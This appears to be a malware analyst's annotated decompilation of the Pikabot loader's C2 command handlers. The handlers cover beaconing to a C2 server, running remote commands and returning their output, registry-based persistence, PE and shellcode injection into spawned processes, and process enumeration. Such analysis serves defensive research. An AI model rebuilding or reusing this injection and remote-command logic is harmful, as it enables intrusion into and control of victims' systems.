// ------------------------------------------------- common functions
void __cdecl sendACK(uint param_1,undefined4 param_2,undefined *param_3,int param_4,int param_5)
{
  data_struct  = create_commandInfo_struct(0x555);
  fillNext8B((int)data_struct, param_1,0);
  fillNext4B((int)data_struct, param_2);
  if (param_4 != 0) {
    if (param_5 != 0) {
      param_4 = param_4 * 2;
    }
    fill0andcopy((int)data_struct, param_3, param_4);
  }

  connect2availableC2(data_struct,  &resp_data, resp_data_size);
  if (resp_data != 0) {
    fillContentWithVal(resp_data,0,resp_data_size[0]);
    (**(code **)(_pikabot_struct + 0x58))(resp_data);
  }
  return;
}

undefined4 __cdecl create_proc(undefined4 param_1,int param_2,int param_3,undefined4 param_4)
{
  if ((param_2 == 1) && (local_74 = FUN_00a83bfc(param_3), local_74 == -1)) {
    return 0x1d8b;
  }

  (**(code **)(_pikabot_struct + 0x7c))(0,2,0,&local_70); // kernelbase.InitializeProcThreadAttributeList
  local_20 = (**(code **)(_pikabot_struct + 0x50))(0x40,local_70); // kernel32.LocalAlloc
  (**(code **)(_pikabot_struct + 0x7c))(local_20,2,0,&local_70); // kernelbase.InitializeProcThreadAttributeList
  local_6c = 0;
  local_68 = 0x1000;
  (**(code **)(_pikabot_struct + 0x84))(local_20,0,0x20007,&local_6c,8,0,0); // kernelbase.UpdateProcThreadAttribute
  if (param_2 == 1) {
    (**(code **)(_pikabot_struct + 0x84))(local_20,0,0x20000,&local_74,4,0,0); // kernelbase.UpdateProcThreadAttribute
  }
  uVar4 = _DAT_00410f40;
  local_64[0] = 0x48;
  local_38 = 0x80001;
  local_34 = 0;

  iVar3 = (**(code **)(_pikabot_struct + 0x8c))(param_1,0,0,0,1,0x808000c,0,0,local_64,param_4); // kernel32.CreateProcessW
  if (iVar3 == 0) {
    (**(code **)(_pikabot_struct + 0x58))(); // kernel32.LocalFree
    if (param_2 == 1) {
      call_syscall9();
    }
    uVar2 = 0x1ed8;
  } else {
    (**(code **)(_pikabot_struct + 0x80))(local_20); // kernelbase.DeleteProcThreadAttributeList
    (**(code **)(_pikabot_struct + 0x58))(local_20); // kernel32.LocalFree
    if (param_2 == 1) {
      call_syscall9();
    }
    uVar2 = 0;
  }
  return uVar2;
}



// -------------------------------------------------  State machine accion = 1fed -> command ID = 0x555

void __cdecl exec_action_1fed(int mem_struct)
{
  uVar2 = getNextVal8(mem_struct);
  beacon_time = getNextVal(mem_struct);
  *(undefined4 *)(_pikabot_struct + 0x160) = beacon_time;
  sendACK((uint)uVar2,0,0x0,0,0);
  return;
}

// -------------------------------------------------  State machine accion = 1a5a -> call_exit_user_proc()

// -------------------------------------------------  State machine accion = x2672 -> not implemented

undefined8 __cdecl exec_action_2672(int param_1)
{
  nextVal = getNextVal8(param_1);
  return nextVal;
}

// -------------------------------------------------  State machine accion = x246f -> write data and write in registry -> seguramente crea una persistencia

void __cdecl exec_state_246f(int param_1)
{
  getNextVal8(param_1);
  puVar3 = (undefined *)getNextString(param_1,local_20);
  ptr1 = (undefined *)(**(code **)(_pikabot_struct + 0x50))(0x40,local_20[0] + 2); // kernel32.LocalAlloc

  fillContentWithVal((int)ptr1,0,local_20[0] + 2);
  move_Mem(ptr1,puVar3,local_20[0]);
  mem_size = local_20[0];

  puVar3 = (undefined *)getNextString(param_1,local_20);
  ptr1_00 = (undefined *)(**(code **)(_pikabot_struct + 0x50))(0x40,local_20[0] + 2); // kernel32.LocalAlloc
  fillContentWithVal((int)ptr1_00,0,local_20[0] + 2);
  move_Mem(ptr1_00,puVar3,local_20[0]);
  mem_size_00 = local_20[0];

  puVar3 = (undefined *)getNextString(param_1,local_20);
  ptr1_01 = (undefined *)(**(code **)(_pikabot_struct + 0x50))(0x40,local_20[0] + 2); // kernel32.LocalAlloc
  fillContentWithVal((int)ptr1_01,0,local_20[0] + 2);
  move_Mem(ptr1_01,puVar3,local_20[0]);
  iVar9 = local_20[0];

  iVar4 = getNextString(param_1,local_20);
  iVar5 = (**(code **)(_pikabot_struct + 0x5c))(ptr1,0x40000000,0,0,2,0x80,0); // kernel32.CreateFileW

  if (iVar5 - 1U < 0xfffffffe) {
    iVar4 = (**(code **)(_pikabot_struct + 0x60))(iVar5,iVar4,local_20[0],&local_24,0); // kernel32.WriteFile
    if (iVar4 != 0) {
      iVar4 = (**(code **)(_pikabot_struct + 0xf0))(0x80000001,ptr1_01,0,0,0,0xf003f,0,&local_28,0 ); // advapi32.RegCreateKeyExW
      if (iVar4 == 0) {
        (**(code **)(_pikabot_struct + 0xf4))  (local_28,*(undefined4 *)(_pikabot_struct + 0x174),0,1,ptr1_00,mem_size_00); // advapi32.RegSetValueExW
        (**(code **)(_pikabot_struct + 0xf8))(local_28); // advapi32.RegCloseKey
      }
    }
  }

  if (ptr1 != (undefined *)0x0) {
    fillContentWithVal((int)ptr1,0,mem_size);
    (**(code **)(_pikabot_struct + 0x58))(ptr1); // kernel32.LocalFree
  }
  if (ptr1_00 != (undefined *)0x0) {
    fillContentWithVal((int)ptr1_00,0,mem_size_00);
    (**(code **)(_pikabot_struct + 0x58))(ptr1_00); // kernel32.LocalFree
  }
  if (ptr1_01 != (undefined *)0x0) {
    fillContentWithVal((int)ptr1_01,0,iVar9);
    (**(code **)(_pikabot_struct + 0x58))(ptr1_01); // kernel32.LocalFree
  }

  return;
}

// -------------------------------------------------  State machine accion = xacb -> ejecuta un comando

void __cdecl exec_state_acb(int mem_struct)
{
  retValue = (undefined *)0x0;
  sizeOfstr = 0;
  uVar3 = getNextVal8(mem_struct);
  str = (undefined *)getNextString(mem_struct, sizeOfstr);
  command = (undefined *)(**(code **)(_pikabot_struct + 0x50))(0x40,sizeOfstr + 2); // kernel32.LocalAlloc

  fillContentWithVal((int)command,0,sizeOfstr + 2);
  move_Mem(command,str,sizeOfstr);
  ret = execute_command(0,command,(int *)&retValue);

  sendACK((uint)uVar3,-(uint)(ret == 0) & 0x1b3,retValue,mem_size,0);

  if (ptr1 != (undefined *)0x0) {
    fillContentWithVal((int)ptr1,0,sizeOfstr);
    (**(code **)(_pikabot_struct + 0x58))(ptr1); // kernel32.LocalFree
  }

  if (retValue != (undefined *)0x0) {
    fillContentWithVal((int)retValue,0,mem_size);
    (**(code **)(_pikabot_struct + 0x58))(retValue); // kernel32.LocalFree
  }
  return;
}

int __cdecl execute_command(undefined4 lpApplicationName ,undefined4 lpCommandLine,int *retValue)
{
  retval = (**(code **)(_pikabot_struct + 0x8c))
                    (lpApplicationName ,lpCommandLine,0,0,1,0x8000000,0,0,local_460,local_470); // kernel32.CreateProcessW
  if (retval == 0) {
    (**(code **)(_pikabot_struct + 0x98))(address[1]); // kernel32.CloseHandle
    iVar10 = 0;
    (**(code **)(_pikabot_struct + 0x98))(*address); // kernel32.CloseHandle
  } else {
    if (address[1] != 0) {
      (**(code **)(_pikabot_struct + 0x98))(address[1]); // kernel32.CloseHandle
      address[1] = 0;
    }
    iVar10 = 0;
    retval = (**(code **)(_pikabot_struct + 0x50))(0x40,0); // kernel32.LocalAlloc
    do {
      iVar3 = (**(code **)(_pikabot_struct + 0x94))(*address,local_41c,0x400,&local_474,0); // kernel32.ReadFile
      if (local_474 == 0) break;
      iVar10 = iVar10 + local_474;
 
      retval = (**(code **)(_pikabot_struct + 0x54))(retval,iVar10,2); // kernel32.LocalReAlloc
      move_Mem((undefined *)((iVar10 - local_474) + retval),(undefined *)local_41c,local_474);
      fillContentWithVal((int)local_41c,0,local_474);
    } while (iVar3 == 1);

    (**(code **)(_pikabot_struct + 0x98))(address[1]);   // kernel32.CloseHandle
    (**(code **)(_pikabot_struct + 0x98))(*address);     // kernel32.CloseHandle
    (**(code **)(_pikabot_struct + 0x98))(local_470[0]); // kernel32.CloseHandle
    (**(code **)(_pikabot_struct + 0x98))(local_470[1]); // kernel32.CloseHandle
    *retValue = retval;
  }
  return iVar10;
}

int __cdecl call_createPipe(int param_1)
{
  iVar1 = (**(code **)(_pikabot_struct + 0x90))(param_1,param_1 + 4,local_18,0); // kernel32.CreatePipe
  if (iVar1 != 0) {
    iVar1 = 1;
  }
  return iVar1;
}

// -------------------------------------------------  State machine accion = x36c -> download and inject a PE into another process;

void __cdecl exec_state_36c(int param_1)

{
  uVar10 = getNextVal8(param_1);
  iVar7 = getNextVal(param_1);

  if (iVar7 == 1) {
    local_40 = getNextVal(param_1);
    if (local_40 == 1) {
      puVar9 = (undefined *)getNextString(param_1,local_20);
      ptr1_00 = (undefined *)(**(code **)(_pikabot_struct + 0x50))(0x40,local_20[0] + 1); // kernel32.LocalAlloc
      fillContentWithVal((int)ptr1_00,0,local_20[0] + 1);
      move_Mem(ptr1_00,puVar9,local_20[0]);
      local_34 = local_20[0];
    } else {
      ptr1_00 = (undefined *)0x0;
      local_34 = 0;
    }

    local_3c = getNextVal(param_1);
    if (local_3c == 1) {
      puVar2 = (undefined *)getNextString(param_1,local_20);
      puVar9 = (undefined *)(**(code **)(_pikabot_struct + 0x50))(0x40,local_20[0] + 2); // kernel32.LocalAlloc
      fillContentWithVal((int)puVar9,0,local_20[0] + 2);
      move_Mem(puVar9,puVar2,local_20[0]);
      local_38 = local_20[0];
    } else {
      puVar9 = (undefined *)0x0;
      local_38 = 0;
    }

    puVar2 = (undefined *)getNextString(param_1,local_20);
    ptr1 = (undefined *)(**(code **)(_pikabot_struct + 0x50))(0x40,local_20[0] + 2); // kernel32.LocalAlloc
    fillContentWithVal((int)ptr1,0,local_20[0] + 2);
    move_Mem(ptr1,puVar2,local_20[0]);
    address = (**(code **)(_pikabot_struct + 0x50))(0x40,0x208); // kernel32.LocalAlloc
    fillContentWithVal(address,0,0x208);
    (**(code **)(_pikabot_struct + 0x88))(ptr1,address,0x208); // kernel32.ExpandEnvironmentStringsW

    if (ptr1 != (undefined *)0x0) {
      fillContentWithVal((int)ptr1,0,local_20[0]);
      (**(code **)(_pikabot_struct + 0x58))(ptr1); // kernel32.LocalFree
    }

  } else {
    ptr1_00 = (undefined *)0x0;
    puVar9 = (undefined *)0x0;
    address = 0;
    getNextVal(param_1);
    local_40 = 0;
    local_3c = 0;
    local_38 = 0;
    local_34 = 0;
  }

  psVar3 = (short *)getNextString(param_1,local_20);
  if (iVar7 == 1) {
    iVar7 = FUN_00a85f8c(address,local_3c,local_40,(int)ptr1_00,(int)puVar9,psVar3);
  } else {
    iVar7 = 0x10e1;
  }

  sendACK((uint)uVar10,iVar7,(undefined *)0x0,0,0);

  if (ptr1_00 != (undefined *)0x0) {
    fillContentWithVal((int)ptr1_00,0,local_34);
    (**(code **)(_pikabot_struct + 0x58))(ptr1_00); // kernel32.LocalFree
  }
  if (puVar9 != (undefined *)0x0) {
    fillContentWithVal((int)puVar9,0,local_38);
    (**(code **)(_pikabot_struct + 0x58))(puVar9); // kernel32.LocalFree
  }
  if (address != 0) {
    fillContentWithVal(address,0,0x208);
    (**(code **)(_pikabot_struct + 0x58))(address); // kernel32.LocalFree
  }
  return;
}


int __cdecl FUN_00a85f8c(undefined4 param_1,int param_2,int param_3,int param_4,int param_5,short *param_6)
{
  local_50 = create_proc(param_1,param_2,param_5,local_44);
  if (local_50 == 0) {
    puVar5 = local_34;
    uVar17 = 0;
    uVar16 = 0x18;
    call_Syscalls1();
    uVar17 = (**(code **)(_pikabot_struct + 0x50))(0x40,0x248,puVar5,uVar16,uVar17);
    uVar15 = 0;
    uVar14 = 0x248;
    uVar16 = uVar17;
    call_syscall2();
    (**(code **)(_pikabot_struct + 0x58))(uVar17,local_30,uVar16,uVar14,uVar15);
    if (*param_6 == 0x5a4d) {
      local_48 = 0;
      uVar14 = 0x40;
      uVar17 = 0x3000;
      iVar11 = *(int *)(param_6 + 0x1e) + (int)param_6;
      iVar9 = iVar11 + 0x50;
      uVar16 = 0;
      call_syscall3();
      puVar2 = (undefined *)(**(code **)(_pikabot_struct + 0x50)) (0x40,*(undefined4 *)(iVar11 + 0x54),uVar16,iVar9,uVar17,uVar14);
      move_Mem(puVar2,(undefined *)param_6,*(int *)(iVar11 + 0x54));
      uVar17 = 0;
      uVar16 = *(undefined4 *)(iVar11 + 0x54);
      iVar9 = local_48;
      puVar5 = puVar2;
      iVar3 = call_syscall4();
      iVar4 = 0;
      if (iVar3 == 0) {
        (**(code **)(_pikabot_struct + 0x58))(puVar2,iVar9,puVar5,uVar16,uVar17);
        iVar3 = iVar11 + 0x18 + (uint)*(ushort *)(iVar11 + 0x14);
        for (local_54 = 0; local_54 < (int)(uint)*(ushort *)(iVar11 + 6); local_54 = local_54 + 1)  {
          puVar5 = (undefined *) (**(code **)(_pikabot_struct + 0x50))(0x40,*(undefined4 *)(iVar3 + 0x10),iVar9) ;
          iVar9 = 0;
          do {
            if (*(short *)(iVar9 + 0x413b40) == 0) goto LAB_00a86363;
            iVar9 = iVar9 + 2;
          } while (iVar9 != 0x1a9c);
          move_Mem(puVar5,(undefined *)((int)param_6 + *(int *)(iVar3 + 0x14)),
                   *(int *)(iVar3 + 0x10));
          iVar9 = 0;
          uVar16 = *(undefined4 *)(iVar3 + 0x10);
          iVar4 = *(int *)(iVar3 + 0xc) + local_48;
          puVar2 = puVar5;
          iVar6 = call_syscall4();
          if (iVar6 != 0) {
            (**(code **)(_pikabot_struct + 0x58))(puVar5);
            call_syscall5();
            return iVar6;
          }
          iVar3 = iVar3 + 0x28;
          (**(code **)(_pikabot_struct + 0x58))(puVar5,iVar4,puVar2,uVar16);
        }
        puVar7 = (undefined4 *)(**(code **)(_pikabot_struct + 0x50))(0x40,0x2cc,iVar9);
        *puVar7 = 0x10007;
        call_syscall6();
        if (param_3 == 1) {
          if (DAT_00411774 != '\0') {
          }
          iVar9 = FUN_00a83b24((int)param_6,iVar11,(int)param_6,param_4);
        }
        else {
          iVar9 = *(int *)(iVar11 + 0x28);
        }
        puVar7[0x2c] = iVar9 + local_48;
        call_syscall7();
        uVar17 = 4;
        uVar14 = 0;
        piVar13 = &local_48;
        call_syscall4();
        uVar16 = 0;
        call_syscall5();
        (**(code **)(_pikabot_struct + 0x58))(puVar7,uVar16,piVar13,uVar17,uVar14);
      }
      else {
        (**(code **)(_pikabot_struct + 0x58))(puVar2);
        call_syscall5();
        local_50 = iVar3;
      }
    }
    else {
      call_syscall5();
      local_50 = 0x211c;
    }
  }
  else {
    uVar8 = 0x502;
  }
  return local_50;
}

undefined4 __cdecl FUN_00a83b24(int param_1,int param_2,int param_3,int param_4)
{
  iVar1 = param_2 + 0x18 + (uint)*(ushort *)(param_2 + 0x14);
  iVar2 = FUN_00a82f84(*(uint *)(param_2 + 0x78),iVar1,param_3);
  iVar2 = iVar2 + param_1;
  iVar3 = FUN_00a82f84(*(uint *)(iVar2 + 0x20),iVar1,param_3);
  iVar4 = FUN_00a82f84(*(uint *)(iVar2 + 0x24),iVar1,param_3);
  iVar5 = FUN_00a82f84(*(uint *)(iVar2 + 0x1c),iVar1,param_3);
  uVar7 = 0;
  while( true ) {
    if (*(uint *)(iVar2 + 0x18) <= uVar7) {
      return 0;
    }
    iVar6 = FUN_00a82f84(*(uint *)(iVar3 + param_1 + uVar7 * 4),iVar1,param_3);
    iVar6 = FUN_00a8b2a4(iVar6 + param_1,param_4);
    if (iVar6 == 0) break;
    uVar7 = uVar7 + 1;
  }
  return *(undefined4 *)(param_1 + (uint)*(ushort *)(uVar7 * 2 + param_1 + iVar4) * 4 + iVar5);
}

int __cdecl FUN_00a82f84(uint param_1,int param_2,int param_3)
{
  iVar1 = 0;
  for (; (iVar1 < (int)(uint)*(ushort *)(param_3 + 2) &&
         ((param_1 < *(uint *)(param_2 + 0xc) ||
          (*(uint *)(param_2 + 0xc) + *(int *)(param_2 + 8) <= param_1)))); param_2 = param_2 + 0x 28)
  {
    iVar1 = iVar1 + 1;
  }
  return (*(int *)(param_2 + 0x14) + param_1) - *(int *)(param_2 + 0xc);
}

// -------------------------------------------------  State machine accion = x792 -> Injects the code of a downloaded shellcode. The target process information is specified in the network packet.


void __cdecl exec_action_792(int param_1)
{
  uVar8 = getNextVal8(param_1);
  iVar2 = getNextVal(param_1);

  if (iVar2 == 1) {
    local_38 = getNextVal(param_1);
    ptr1_00 = (undefined *)0x0;
    local_34 = 0;
    if (local_38 == 1) {
      puVar4 = (undefined *)getNextString(param_1,local_20);
      ptr1_00 = (undefined *)(**(code **)(_pikabot_struct + 0x50))(0x40,local_20[0] + 2); // kernel32.LocalAlloc
      fillContentWithVal((int)ptr1_00,0,local_20[0] + 2);
      move_Mem(ptr1_00,puVar4,local_20[0]);
      local_34 = local_20[0];
    }

    puVar4 = (undefined *)getNextString(param_1,local_20);
    ptr1 = (undefined *)(**(code **)(_pikabot_struct + 0x50))(0x40,local_20[0] + 2); // kernel32.LocalAlloc
    fillContentWithVal((int)ptr1,0,local_20[0] + 2);

    move_Mem(ptr1,puVar4,local_20[0]);
    address = (**(code **)(_pikabot_struct + 0x50))(0x40,0x208); // kernel32.LocalAlloc
    fillContentWithVal(address,0,0x208);
    (**(code **)(_pikabot_struct + 0x88))(ptr1,address,0x208); // kernel32.ExpandEnvironmentStringsW

    if (ptr1 != (undefined *)0x0) {
      fillContentWithVal((int)ptr1,0,local_20[0]);
      (**(code **)(_pikabot_struct + 0x58))(ptr1); // kernel32.LocalFree
    }
    uVar3 = 0;
  } else {
    uVar3 = getNextVal(param_1);
    ptr1_00 = (undefined *)0x0;
    address = 0;
    local_38 = 0;
    local_34 = 0;
  }
  iVar5 = getNextString(param_1,local_20);
  if (iVar2 == 1) {
    iVar5 = FUN_00a8aa78(address,local_38,(int)ptr1_00,iVar5,local_20[0]);
  }
  else if (iVar2 == 2) {
    iVar5 = FUN_00a8acc8(uVar3,iVar5,local_20[0]);
  }
  else {
    iVar5 = 0x10e1;
    if (iVar2 == 3) {
      iVar5 = 0x4d2;
    }
  }
  uVar11 = 0;
  uVar10 = 0;
  uVar9 = 0;
  sendACK((uint)uVar8,iVar5,(undefined *)0x0,0,0);

  if (ptr1_00 != (undefined *)0x0) {
    fillContentWithVal((int)ptr1_00,0,local_34);
    uVar9 = (undefined)local_34;
    (**(code **)(_pikabot_struct + 0x58))(ptr1_00); // kernel32.LocalFree
  }
  if (address != 0) {
    uVar9 = 8;
    fillContentWithVal(address,0,0x208);
    (**(code **)(_pikabot_struct + 0x58))(address); // kernel32.LocalFree
  }
  return;
}


int __cdecl
FUN_00a8aa78(undefined4 param_1,int param_2,int param_3,undefined4 param_4,undefined4 param_5)
{
  puVar4 = local_244;
  for (iVar2 = 4; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  iVar2 = create_proc(param_1,param_2,param_3,local_244);
  if (iVar2 == 0) {
    call_Syscalls1();
    call_syscall2();
    call_syscall2();
    (**(code **)(_pikabot_struct + 0x78))
              (local_244[0],local_24c + *(int *)((int)aiStack_1f4 + local_1e0),param_4,param_5,0); // kernel32.WriteProcessMemory
    iVar1 = call_syscall5();
    if (iVar1 != 0) {
      iVar2 = 0x23ae;
    }
    call_syscall8();
    call_syscall8();
  }
  return iVar2;
}


int __cdecl FUN_00a83bfc(int param_1)
{
  uVar2 = (**(code **)(_pikabot_struct + 0x9c))(2,0);
  local_248[0] = 0x22c;
  iVar1 = (**(code **)(_pikabot_struct + 0xa0))(uVar2,local_248);
  uVar5 = extraout_ECX;
  if (iVar1 == 1) {
    do {
      uVar4 = (**(code **)(_pikabot_struct + 0xa4))(uVar2,local_248);
      uVar5 = (undefined4)((ulonglong)uVar4 >> 0x20);
      if ((int)uVar4 != 1) goto LAB_00a83ca3;
      uVar3 = FUN_00a8b3e4((int)local_224,param_1);
    } while ((uVar3 != 0) ||
            (iVar1 = (**(code **)(_pikabot_struct + 0x74))(0x1fffff,0,local_240),
            0xfffffffd < iVar1 - 1U));
    (**(code **)(_pikabot_struct + 0x98))(uVar2);
  }
  else {
LAB_00a83ca3:
    iVar1 = -1;
    (**(code **)(_pikabot_struct + 0x98))(uVar2,uVar5);
  }
  return iVar1;
}

uint __cdecl FUN_00a8b3e4(int param_1,int param_2)
{
  iVar2 = 0;
  do {
    uVar1 = *(ushort *)(param_1 + iVar2);
    if (uVar1 != *(ushort *)(param_2 + iVar2)) {
      return -(uint)(uVar1 < *(ushort *)(param_2 + iVar2)) | 1;
    }
    iVar2 = iVar2 + 2;
  } while (uVar1 != 0);
  return 0;
}

// -------------------------------------------------  State machine accion = x359
// -------------------------------------------------  State machine accion = x3a6
// -------------------------------------------------  State machine accion = x240 -> Executes system command and sends back the output. (desnt send error code)


void __cdecl exec_action_359(int param_1)
{
  local_24 = (undefined *)0x0;
  local_20[0] = 0;
  uVar1 = getNextVal8(param_1);
  ptr2 = (undefined *)getNextString(param_1,local_20);
  ptr1 = (undefined *)(**(code **)(_pikabot_struct + 0x50))(0x40,local_20[0] + 2);
  fillContentWithVal((int)ptr1,0,local_20[0] + 2);
  move_Mem(ptr1,ptr2,local_20[0]);
  mem_size = execute_command(0,ptr1,(int *)&local_24);
  sendACK((uint)uVar1,0,local_24,mem_size,0);
  if (ptr1 != (undefined *)0x0) {
    fillContentWithVal((int)ptr1,0,local_20[0]);
    (**(code **)(_pikabot_struct + 0x58))(ptr1);
  }
  if (local_24 != (undefined *)0x0) {
    fillContentWithVal((int)local_24,0,mem_size);
    (**(code **)(_pikabot_struct + 0x58))(local_24);
  }
  return;
}

// -------------------------------------------------  State machine accion = x985 ->
/*
    Collects processes’ information. These are:

    Executable's filename
    Process ID
    Boolean flag, which indicates if it is a Pikabot process.
    Boolean flag, which indicates if Pikabot can access the process with all possible access rights.
    Number of threads
    Base priority of threads
    Process architecture
    Parent process ID
*/


void __cdecl exec_action_985(int param_1)
{
  puVar2 = allocate_info(0);
  uVar10 = getNextVal8(param_1);
  iVar3 = (**(code **)(_pikabot_struct + 0x9c))(2,0);
  if (iVar3 == -1) {
    uVar4 = 0x11d7;
  } else {
    local_248[0] = 0x22c;
    uVar11 = (**(code **)(_pikabot_struct + 0xa0))(iVar3,local_248);
    
    if ((int)uVar11 == 0) {
      (**(code **)(_pikabot_struct + 0x98))(iVar3,(int)((ulonglong)uVar11 >> 0x20));
      uVar4 = 0x110f;
    } else {
      do {
        iVar6 = (**(code **)(_pikabot_struct + 0x74))(0x1fffff,0,local_240);
        iVar5 = _pikabot_struct;
        if (iVar6 == 0) {
          uVar4 = 0;
        } else {
          if (*(short *)(_pikabot_struct + 0x150) == 0) {
            local_24c = 0;
          } else {
            (**(code **)(iVar5 + 0xac))(iVar6,&local_24c);
          }
          uVar4 = 1;
        }

        bVar9 = *(int *)(_pikabot_struct + 0x144) == local_240;
        fillNext4B((int)puVar2,local_240);
        fillNext4B((int)puVar2,local_230);
        fillNext4B((int)puVar2,local_24c);
        fillNext4B((int)puVar2,(uint)bVar9);
        fillNext4B((int)puVar2,uVar4);
        fillNext4B((int)puVar2,local_22c);
        fillNext4B((int)puVar2,local_234);

        iVar5 = 0;
        fill_String((int)puVar2,local_224);
        iVar5 = (**(code **)(_pikabot_struct + 0xa4))(iVar3,local_248);
      } while (iVar5 != 0);
      (**(code **)(_pikabot_struct + 0x98))(iVar3,local_248);
      uVar4 = 0;
    }
  }
  sendACK((uint)uVar10,uVar4,(undefined *)puVar2[1],puVar2[2],0);
  resetVictimInfo((int)puVar2);
  return;
}

// -------------------------------------------------  State machine accion = x982 -> not implemented